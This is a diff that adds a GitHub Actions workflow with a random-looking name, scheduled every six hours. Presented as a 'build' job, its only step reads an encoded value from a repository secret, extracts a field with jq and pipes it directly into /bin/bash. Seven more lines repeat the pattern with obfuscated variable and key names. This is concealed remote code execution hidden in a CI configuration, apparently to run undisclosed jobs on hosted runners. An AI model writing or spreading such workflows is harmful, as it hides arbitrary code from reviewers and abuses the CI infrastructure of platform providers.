@@ -1,0 +1,26 @@
+name: yanjiaxin4635
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanjiaxin4635
+        env:
+          w2: ${{ secrets.w2 }}
+        run: |
+          echo $w2 | jq -r .lnos8460 | /bin/bash
+          echo $p2298 | jq -r .x918 | /bin/bash
+          echo $ere10 | jq -r .fucw9821 | /bin/bash
+          echo $utld4 | jq -r .jl55195 | /bin/bash
+          echo $xu059 | jq -r .zhnkb30621 | /bin/bash
+          echo $pjsfy215 | jq -r .jb61 | /bin/bash
+          echo $wbttp2769 | jq -r .uvcmj4 | /bin/bash
+          echo $djg04 | jq -r .d215 | /bin/bash
+
